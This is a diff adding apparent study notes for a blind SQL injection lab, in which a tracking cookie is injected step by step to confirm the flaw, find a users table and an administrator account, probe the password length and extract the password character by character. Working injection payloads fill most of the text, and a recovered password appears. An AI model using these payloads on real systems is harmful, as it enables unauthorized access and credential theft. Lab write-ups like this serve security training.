@@ -1,0 +1,48 @@
+Blind SQL Injection 
+
+Vulnerable Parameter - tracking cookie
+
+End Goal:
+1. Enumerate the password of the admin
+2. Log in as admin
+
+Analysis:
+
+1) Confirm that parameter is vulnerable to Blind SQL Injection
+
+select tracking-id from tracking table where trackingId = 'rzrZNR1EFclTLkNw'
+
+-> If tracking id exists -> query returns value -> Welcome back Message
+-> If trackig Id does't exist -> query returns nothing -> No Welcome Message
+
+select tracking-id from tracking-table where trackingId = 'rzrZNR1EFclTLkNw'and 1=1--'
+-> True -> Welcome back
+
+-> if false we have a Blind based SQL injection
+select tracking-id from tracking-table where trackingId = 'rzrZNR1EFclTLkNw'and 1=0--'
+-> False - No Welcome Back
+
+2) Confirm that we have a Users Table 
+
+select tracking-id from tracking-table where trackingId = 'rzrZNR1EFclTLkNw'and (select 'x' from users LIMIT 1)='x'--'
+-> users table exists in database (shows welcome back)
+
+3) Confirm username administrator exists users table
+select tracking-id from tracking-table where trackingId = 'rzrZNR1EFclTLkNw'and (select username from users where username='administrator')='administrator'--'
+-> Admin exists
+
+4) Enumerate the password of the admin username
+select tracking-id from tracking-table where trackingId = 'rzrZNR1EFclTLkNw'and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
+-> password is exactly 20 characters
+
+select tracking-id from tracking-table where trackingId = 'rzrZNR1EFclTLkNw'and (select substring(password,1,1) from users where username='administrator')='a'--'
+
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+z031bfzdzznjleedfvuw
+
+// change the 1 and increment each time to find the length of password
+-> need a script for password 
+
+
+------ SCRIPT ------
+script.py url 
